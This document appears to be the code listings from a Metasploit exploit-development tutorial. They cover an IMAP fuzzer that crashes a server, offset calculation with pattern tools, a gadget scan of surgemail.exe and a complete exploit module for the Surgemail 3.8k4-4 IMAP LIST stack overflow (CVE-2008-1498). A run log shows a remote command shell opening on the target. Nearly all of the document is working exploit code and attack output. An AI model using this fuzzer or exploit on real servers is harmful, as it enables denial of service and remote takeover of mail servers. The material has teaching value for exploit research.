["```\nrequire 'msf/core'\nclass Metasploit3 < Msf::Auxiliary\n   include `Msf::Exploit::Remote::Imap`\n   include `Msf::Auxiliary::Dos`\n        def initialize\n                super(\n                        'Name'           => 'Simple IMAP Fuzzer',\n                        'Description'    => %q{\n                                                An example of how to\n build a simple IMAP fuzzer.\n                                                Account IMAP\n credentials are required in this\n                                                     fuzzer.},\n                        'Author'         => [ 'ryujin' ],\n                        'License'        => MSF_LICENSE,\n                        'Version'        => '$Revision: 1 $'\n                )\n        end\n        def fuzz_str()\n             `return Rex::Text.rand_text_alphanumeric(rand(1024))`\n        end\n        def run()\n                srand(0)\n                while (true)\n                     connected = connect_login()\n                        if not connected\n                              print_status(\n`\"Host is not responding - this is G00D ;`)\")\n                                break\n                        end\n                        print_status(\"Generating fuzzed data...\")\n                    `fuzzed = fuzz_str()`\n                        print_status(\"Sending fuzzed data,\n buffer length = %d\" % fuzzed.length)\n                    req = '0002 LIST () \"/' + fuzzed + '\" \"PWNED\"' + \"\\r\\n\"\n                        print_status(req)\n                        res = raw_send_recv(req)\n                                if !res.nil?\n                        print_status(res)\n                                else\n                                      print_status(`\"Server crashed, no response\"`)\n                                        break\n                                end\n                        disconnect()\n                end\n        end\nend\n```", "```\nmsf > `use auxiliary/fuzzers/imap_fuzz`\nmsf auxiliary(imap_fuzz) > `show options`\n\nModule options:\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   IMAPPASS                   no        The password for the specified username\n   IMAPUSER                   no        The username to authenticate as\n   RHOST                      yes       The target address\n   RPORT     143              yes       The target port\n\nmsf auxiliary(imap_fuzz) > `set IMAPPASS test`\nIMAPPASS => test\nmsf auxiliary(imap_fuzz) > `set IMAPUSER test`\nIMAPUSER => test\nmsf auxiliary(imap_fuzz) > `set RHOST 192.168.1.155`\nRHOST => 192.168.1.155\nmsf auxiliary(imap_fuzz) >\n```", "```\nmsf auxiliary(imap_fuzz) > `run`\n\n [*] Authenticating as test with password test...\n  [*] Generating fuzzed data...\n [*] Sending fuzzed data, buffer length = 684\n\n [*] 0002 LIST () \"/v1AD7DnJTVykXGYYM6BmnXuYRlZNIJUzQzFPvA\nSjYxzdTTOngBJ5gfK0XjLy3ciAAk1Fmo0\n       RPEpq6f4BBnp5jm3LuSbAOj1M5qULEGEv0DMk0oOPUj6XPN1VwxFpjAf\nFeAxykiwdDiqNwnVJAKyr6X7C5ije7\n       DSujURybOp6BkKWroLCzQg2AmTuqz48oNeY9CDeirNwoITfIaC40\nDs9OgEDtL8WN5tL4QYdVuZQ85219Thogk7\n       75GVfNH4YPpSo2PLmvd5Bf2sY9YDSvDqMmjW9FXrgLoUK2rl9cvoCbTZ\nX1zuU1dDjnJJpXDuaysDfJKbtHn9Vh\n       siiYhFokALiF1QI9BRwj4bo0kwZDn8jyedxhSRdU9CFlMs19CvbVnnL\nWeRGHScrTxpduVJZygbJcrRp6AWQqke\n       Y0DzI4bd7uXgTIHXN6R403ALckZgqOWcUSEWj6THI9NFAIPP1LEnctaK\n0uxbzjpS1ize16r388StXBGq1we7Qa\n       8j6xqJsN5GmnIN4HQ4W4PZIjGRHUZC8Q4ytXYEksxXe2ZUhl5Xbdhz13\nzW2HpxJ2AT4kRU1wDqBUkEQwvKtoeb\n       rfUGJ8bvjTMSxKihrDMk6BxAnY6kjFGDi5o8hcEag4tzJ1FhH9eI2UHD\nVbsDmUHTfAFbreJTHVlcIruAozmZKz\n       i7XgTaOgzGh\" \"PWNED\"\n\n [*] 0002 OK LIST completed\n\n  `. . . SNIP . . .`\n\n  [*] Authenticating as test with password test...\n  [*] Generating fuzzed data...\n  [*] Sending fuzzed data, buffer length = `1007`\n  [*] 0002 LIST () \"/FzwJjIcL16vW4PXDPpJbpsHB4p7Xts9fbaJYjRJASXR\nqbZnOMzprZfVZH7BYvcHuwlN0Yq\n       yfoCrJyobzOqoscJeTeRgrDQKA8MDDLbmY6WCQ6XQH9Wkj4c9JCfPjIq\nTndsocWBz1xLMX1VdsutJEtnceHvhl\n       Gqee6Djh7v3oJW4tXJMMxe8uR2NgBlKoCbH18VTR8GUFqWCmQ097\n0B3gR9foi6inKdWdcE6ivbOHElAiYkFYzZ\n       06Q5dvza58DVhn8sqSnRAmq1UlcUGuvr6r99POlrZst10r606J2B03TBGDFuy\n0dNMI0EUANKZ6OnCn3Zk1JL65\n       9MC8PZy0frCiPBqZ4xn0biAjFTH5LsCjIFuI5eZ9LsdXdek7iiOhEmW6\nD86mAtyg9S1a7RALrbRcLIHJpwMsEE\n       5LS1wIV9aFPS6RQwI4DtF4bGSle1FCyf63hy3Vo8AKkId6yu5MfjwfUExand\nVeUldk8c5bhlyqoDp3UX2ClQPZ\n       os0KpFoIcxmq8R0E3Ri54l5Yl3OPcN7U20Kb1CEAfbhxGFgh1oMzjJpuM7\nIbHMrZNjVADz6A0byzgiP2pXa7Zm\n       OloV9u6Fwa0l6sR6oL0Png9MYNwTMXTUdiE7rOjuOmkdgglPTkZ3n4de1FE\naLh8Xhf9SNSPZUX0M7gmUiyNYv6\n       qti3Omy8qvjJOQui1IhUhf5fKOunKIcB5Zw7quznxV1GF2R5hXVTw1vlbMi5\nTQW68ZDFlD6q6BJ4S3oNrFCyXX\n       aQpAURyCoDGdjoxk1vrUPGusf3i4EIF2iqyyekWiQ7GuYcwMax3o0ZXB2djFh2\ndYEGyBSCHaFhpwUgamThinnM\n       AsDFuEY9Hq9UOQSmZ6ySunifPFjCbDs4Zooquw0HPaVnbNVo97tfVBYSei9dWCUWwU\nAPVJVsTGoDNRVarOrg8q\n       wbziv8aQaPZ7Y8r0SUiB1nNhlhl3UCVZpf8Gck0psjETf4ks356q0I\n3mLZkqCLkznVV4ayetVgaDm\" \"PWNED\"\n\n [*] Server crashed, no response\n  [*] Auxiliary module execution completed\n  msf auxiliary(imap_fuzz) >\n```", "```\nprint_status(\"Generating fuzzed data...\")\n `fuzzed = \"A\" * 11000`\n  print_status(\"Sending fuzzed data, buffer length = %d\" % fuzzed.length)\n  req = '0002 LIST () \"/' + fuzzed + '\" \"PWNED\"' + \"\\r\\n\"\n```", "```\nprint_status(\"Generating fuzzed data...\")\n  fuzzed = `Rex::Text.pattern_create`(11000)\n  print_status(\"Sending fuzzed data, buffer length = %d\" % fuzzed.length)\n  req = '0002 LIST () \"/' + fuzzed + '\" \"PWNED\"' + \"\\r\\n\"\n```", "```\nroot@bt:Ëœ/.msf3/modules/auxiliary/fuzzers#\n `/opt/metasploit3/msf3/tools/pattern_offset.rb`\n      `684E3368 11000`\n10360\n```", "```\nprint_status(\"Generating fuzzed data...\")\n fuzzed = \"\\x41\" * `10360` fuzzed << \"\\x42\" * `4` fuzzed << \"\\x43\" * `636`\nprint_status(\"Sending fuzzed data, buffer length = %d\" % fuzzed.length)\n```", "```\n[Buffer of garbage | NOP Slide | Shellcode | Near Jump | Short Jump | POP-POP-RETN]\n```", "```\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Exploit::Remote\n\n    include Msf::Exploit::Remote::Imap\n\n    def initialize(info = {})\n        super(update_info(info,\n            'Name'           => 'Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow',\n            'Description'    => %q{\n                This module exploits a stack overflow in the Surgemail IMAP Server\n                version 3.8k4-4 by sending an overly long LIST command. Valid IMAP\n                account credentials are required.\n            },\n            'Author'         => [ 'ryujin' ],\n            'License'        => MSF_LICENSE,\n            'Version'        => '$Revision: 1 $',\n            'References'     =>\n                [\n                    [ 'BID', '28260' ],\n                    [ 'CVE', '2008-1498' ],\n                    [ 'URL', 'http://www.exploit-db.com/exploits/5259' ],\n                ],\n            'Privileged'     => false,\n            'DefaultOptions' =>\n                {\n                    'EXITFUNC' => 'thread',\n                },\n            'Payload'        =>\n                {\n                  `'Space'       => 10351,`\n                    'DisableNops' => true,\n                    'BadChars'    => \"\\x00\"\n                },\n            'Platform'       => 'win',\n            'Targets'        =>\n                [\n                   [ 'Windows Universal', { 'Ret' =>\n 0xDEADBEEF } ], # p/p/r TBD\n                ],\n            'DisclosureDate' => 'March 13 2008',\n            'DefaultTarget' => 0))\n    end\n\n    def exploit\n      connected = connect_login\n      lead = \"\\x41\" * 10360\n      evil = lead + \"\\x43\" * 4\n        print_status(\"Sending payload\")\n      sploit = '0002 LIST () \"/' + evil + '\" \"PWNED\"' + \"\\r\\n\"\n      sock.put(sploit)\n        handler\n        disconnect\n    end\n\nend\n```", "```\nmsf > `info payload/windows/shell_bind_tcp`\n\n       Name: Windows Command Shell, Bind TCP Inline\n     Module: payload/windows/shell_bind_tcp\n    Version: 8642\n   Platform: Windows\n       Arch: x86\nNeeds Admin: No\n Total size: 341\n       Rank: Normal\n```", "```\nroot@bt:/tmp# `msfpescan -p surgemail.exe`\n\n[surgemail.exe]\n0x0042e947 pop esi; pop ebp; ret\n0x0042f88b pop esi; pop ebp; ret\n0x00458e68 pop esi; pop ebp; ret\n0x00458edb pop esi; pop ebp; ret\n0x0046754d pop esi; pop ebp; ret\n0x00467578 pop esi; pop ebp; ret\n0x0046d204 pop eax; pop ebp; ret\n\n`. . . SNIP . . .`\n\n0x0078506e pop ebx; pop ebp; ret\n0x00785105 pop ecx; pop ebx; ret\n`0x0078517e` pop esi; pop ebx; ret\n```", "```\n'Platform'       => 'win',\n            'Targets'        =>\n                [\n                  [ 'Windows Universal', { 'Ret' =>\n `\"\\x7e\\x51\\x78\"` } ], # p/p/r in surgemail.exe\n                ],\n            'DisclosureDate' => 'March 13 2008',\n            'DefaultTarget' => 0))\n    end\n\n    def exploit\n        connected = connect_login\n        lead = \"\\x41\" * 10360\n      evil = lead + `[target.ret].pack(\"A3\")`\n        print_status(\"Sending payload\")\n        sploit = '0002 LIST () \"/' + evil + '\" \"PWNED\"' + \"\\r\\n\"\n```", "```\nmsf > `use exploit/windows/imap/surgemail_book`\n  msf exploit(surgemail_book) > `set IMAPPASS test`\n  IMAPPASS => test\n  msf exploit(surgemail_book) > `set IMAPUSER test`\n  IMAPUSER => test\n  msf exploit(surgemail_book) > `set RHOST 192.168.1.155`\n  RHOST => 192.168.1.155\n msf exploit(surgemail_book) > `set PAYLOAD generic/debug_trap`\n  PAYLOAD => generic/debug_trap\n  msf exploit(surgemail_book) > `exploit`\n\n  [*] Authenticating as test with password test...\n  [*] Sending payload\n  [*] Exploit completed, but no session was created.\n  msf exploit(surgemail_book) >\n```", "```\ndef exploit\n        connected = connect_login\n      lead = \"\\x41\" * `10356`\n      nseh = `\"\\xeb\\xf9\\x90\\x90\"`\n        evil = lead + nseh + [target.ret].pack(\"A3\")\n        print_status(\"Sending payload\")\n        sploit = '0002 LIST () \"/' + evil + '\" \"PWNED\"' + \"\\r\\n\"\n        sock.put(sploit)\n        handler\n        disconnect\nend\n```", "```\ndef exploit\n        connected = connect_login\n      lead = \"\\x90\" * (`10351` - payload.encoded.length)\n      near = \"\\xe9\\xdd\\xd7\\xff\\xff\"\n        nseh = \"\\xeb\\xf9\\x90\\x90\"\n      evil = lead + payload.encoded + near + nseh + [target.ret].pack(\"A3\")\n        print_status(\"Sending payload\")\n        sploit = '0002 LIST () \"/' + evil + '\" \"PWNED\"' + \"\\r\\n\"\n        sock.put(sploit)\n        handler\n        disconnect\nend\n```", "```\nmsf exploit(surgemail_book) > `set payload windows/shell_bind_tcp`\npayload => windows/shell_bind_tcp\n\nmsf exploit(surgemail_book) > `exploit`\n\n[*] Started bind handler\n[*] Authenticating as test with password test...\n[*] Sending payload\n[*] Exploit completed, but no session was created.\nmsf exploit(surgemail_book) >\n```", "```\n'Privileged'     => false,\n'DefaultOptions'  =>\n    {\n        'EXITFUNC' => 'thread',\n    },\n'Payload'         =>\n    {\n        'Space'       => 10351,\n        'DisableNops' => true,\n        `'BadChars'    => \"\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\x2c\\x3a\\x40\\x7b\"`\n    },\n'Platform'        => 'win',\n'Targets'        =>\n```", "```\nmsf exploit(surgemail_book) > `rexploit`\n\n[*] Started bind handler\n[*] Authenticating as test with password test...\n[*] Sending payload\n[*] Exploit completed, but no session was created.\nmsf exploit(surgemail_book) > `rexploit`\n\n[*] Started bind handler\n[*] Authenticating as test with password test...\n[*] Sending payload\n[*] Exploit completed, but no session was created.\nmsf exploit(surgemail_book) > `rexploit`\n\n[*] Started bind handler\n[*] Authenticating as test with password test...\n[*] Sending payload\n[*] Command shell session 1 opened (192.168.1.101:59501 -> 192.168.1.155:4444)\n\n(C) Copyright 1985-2001 Microsoft Corp.\n\nc:\\surgemail>\n```", "```\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Exploit::Remote\n\n    include Msf::Exploit::Remote::Imap\n\n    def initialize(info = {})\n        super(update_info(info,\n            'Name'           => 'Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow',\n            'Description'    => %q{\n                This module exploits a stack overflow in the Surgemail IMAP Server\n                version 3.8k4-4 by sending an overly long LIST command. Valid IMAP\n                account credentials are required.\n            },\n            'Author'         => [ 'ryujin' ],\n            'License'        => MSF_LICENSE,\n            'Version'        => '$Revision: 1 $',\n            'References'     =>\n                [\n                    [ 'BID', '28260' ],\n                    [ 'CVE', '2008-1498' ],\n                    [ 'URL', 'http://www.exploit-db.com/exploits/5259' ],\n                ],\n            'Privileged'     => false,\n            'DefaultOptions' =>\n                {\n                    'EXITFUNC' => 'thread',\n                },\n            'Payload'        =>\n                {\n                    'Space'       => 10351,\n                    'DisableNops' => true,\n                    'BadChars'    => \"\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\x2c\\x3a\\x40\\x7b\"\n                },\n            'Platform'       => 'win',\n            'Targets'        =>\n                [\n                    [ 'Windows Universal', { 'Ret' =>\n \"\\x7e\\x51\\x78\" } ], # p/p/r in surgemail.exe\n                ],\n            'DisclosureDate' => 'March 13 2008',\n            'DefaultTarget'  => 0))\n    end\n\n    def exploit\n        connected = connect_login\n        lead = \"\\x90\" * (10351 - payload.encoded.length)\n        near = \"\\xe9\\xdd\\xd7\\xff\\xff\"\n        nseh = \"\\xeb\\xf9\\x90\\x90\"\n        evil = lead + payload.encoded + near + nseh + [target.ret].pack(\"A3\")\n        print_status(\"Sending payload\")\n        sploit = '0002 LIST () \"/' + evil + '\" \"PWNED\"' + \"\\r\\n\"\n        sock.put(sploit)\n        handler\n        disconnect\n    end\n\nend\n```"]